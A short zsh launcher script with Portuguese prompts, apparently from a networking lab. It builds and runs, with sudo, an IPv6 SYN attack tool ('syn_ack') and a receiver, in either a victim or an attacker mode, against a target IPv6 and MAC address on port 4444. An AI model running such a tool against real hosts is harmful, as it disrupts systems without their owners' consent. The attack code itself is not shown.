
#/bin/zsh

make clean
make syn_ack recv6_ll

echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
 
echo "      ░██████╗██╗░░░██╗███╗░░██╗  ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗"
echo "      ██╔════╝╚██╗░██╔╝████╗░██║  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝"
echo "      ╚█████╗░░╚████╔╝░██╔██╗██║  ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░"
echo "      ░╚═══██╗░░╚██╔╝░░██║╚████║  ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░"
echo "      ██████╔╝░░░██║░░░██║░╚███║  ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗"
echo "      ╚═════╝░░░░╚═╝░░░╚═╝░░╚══╝  ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝"

echo ""
echo ""
echo ""
echo ""
echo ""

echo "selecione: (1) vitima, (2) atacante?"
read option;

# pegando nome da interface e ip versão 6 da maquina.
device=$(ifconfig wlp7s0 | grep -Eo '[a-z]{3}[0-9]{1}[a-z]{1}[0-9]{1}')
my_ip=$(ifconfig $device | grep -Eo '([a-f0-9]{4}:):{1}([a-f0-9]{4}:){3}[0-9]{4}')
dst_port=4444
src_port=4444

# verifica seleção
if [ $option -eq 1 ];
then
    sudo ./recv6_ll $device
    make clean
 
elif  [ $option -eq 2 ];
then
    echo "Informar o ip da vitima:"
    read victim_ip
    
    echo "Informar mac da vitima:"
    read dst_mac

    sudo ./syn_ack $device $my_ip $victim_ip $dst_mac $dst_port $src_port
    make clean

fi


